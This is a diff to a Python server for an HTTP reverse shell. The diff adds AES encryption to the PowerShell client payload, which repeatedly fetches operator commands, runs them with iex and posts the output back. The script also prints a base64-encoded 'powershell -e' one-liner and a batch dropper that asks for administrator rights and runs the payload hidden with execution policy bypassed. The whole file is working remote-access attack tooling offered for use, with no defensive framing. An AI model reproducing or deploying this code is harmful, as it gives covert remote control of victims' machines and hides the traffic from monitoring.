@@ -1,11 +1,17 @@
-import http.server, socketserver, signal, base64
+import http.server
+import socketserver
+import signal
+import base64
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from base64 import b64encode, b64decode
 
 ADDRESS = "0.0.0.0"
 PORT = 8000
 
 GREEN = '\033[38;5;47m'; END = '\033[0m'
 
-payload = f"& {{while ($true) {{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($c) -join ' ')}}}}"
+payload = f'$Key = [System.Text.Encoding]::UTF8.GetBytes("abcdefghijklmnop");$AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC;$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$AES.Key = $Key;while ($true) {{$AES.IV = New-Object byte[] 16;$Decryptor = $AES.CreateDecryptor();$Response = Invoke-WebRequest -Uri "http://{ADDRESS}:{PORT}";$CipherText = [Convert]::FromBase64String($Response.Content);$PlainText = $Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length);$Decrypted = [System.Text.Encoding]::UTF8.GetString($PlainText);$Exe = iex $Decrypted;$PlainText = [System.Text.Encoding]::UTF8.GetBytes($Exe);$Encryptor = $AES.CreateEncryptor();$CipherText = $Encryptor.TransformFinalBlock($PlainText, 0, $PlainText.Length);$Encoded = [Convert]::ToBase64String($CipherText);Invoke-WebRequest -Uri "http://{ADDRESS}:{PORT}" -Method POST -Body $Encoded}}'
 e_payload = base64.b64encode(payload.encode('utf-16le')).decode('utf-8')
 print(f"{GREEN}PAYLOAD:{END}")
 print (f"powershell -e {e_payload}")
@@ -13,21 +19,41 @@ print("")
 print(f"{GREEN}PAYLOAD .bat{END}")
 print(f"@echo off\nnet session >nul 2>&1\nif %errorLevel% == 0 (\n  goto start\n) else (\n  powershell -Command \"Start-Process '%comspec%' -ArgumentList '/c %~dpnx0' -Verb RunAs\" && exit\n)\n:start\npowershell -NoProfile -ExecutionPolicy Bypass -W hidden -Command \"{e_payload}\"\n")
 
+key = b'abcdefghijklmnop'
+cipher = Cipher(algorithms.AES(key), modes.CBC(b'\x00'*16))
+
 class Http_Shell(http.server.BaseHTTPRequestHandler):
+
+    def encrypt_a(self, command):
+        padder = padding.PKCS7(128).padder()
+        padded_data = padder.update(command.encode()) + padder.finalize()
+        encryptor = cipher.encryptor()
+        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+        encrypted_b64 = b64encode(encrypted_data)
+        return encrypted_b64
+
+    def decrypt_a(self, encoded_command):
+        encrypted_data = b64decode(encoded_command)
+        decryptor = cipher.decryptor()
+        padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
+        unpadder = padding.PKCS7(128).unpadder()
+        unpadded_data = unpadder.update(padded_data) + unpadder.finalize()
+        return unpadded_data
+
     def do_GET(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
         command_input = input(f'{GREEN}$hell > {END}')
-        self.wfile.write(bytes(command_input + '\n', "utf-8"))
+        encrypt_command = self.encrypt_a(command_input)
+        self.wfile.write(encrypt_command)
 
     def do_POST(self):
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length)
-        byte_list = [int(b) for b in post_data.split()]
-        byte_seq = bytes(byte_list)
-        print(byte_seq.decode('utf-8'))
-        
+        unpadded_data = self.decrypt_a(post_data)
+        print(unpadded_data.decode('utf-8'))
+
     def log_message(self, format, *args):
         return
 
@@ -35,8 +61,8 @@ def signal_handler(sig, frame):
     print("Closing server ...")
     httpd.server_close()
 
-with socketserver.TCPServer(("", PORT), Http_Shell) as httpd:
-    print("Listening on port", PORT)
+with socketserver.TCPServer((ADDRESS, PORT), Http_Shell) as httpd:
+    print("Listening on", ADDRESS, "port", PORT)
     print(" ")
     httpd.serve_forever()
     signal.signal(signal.SIGINT, signal_handler)
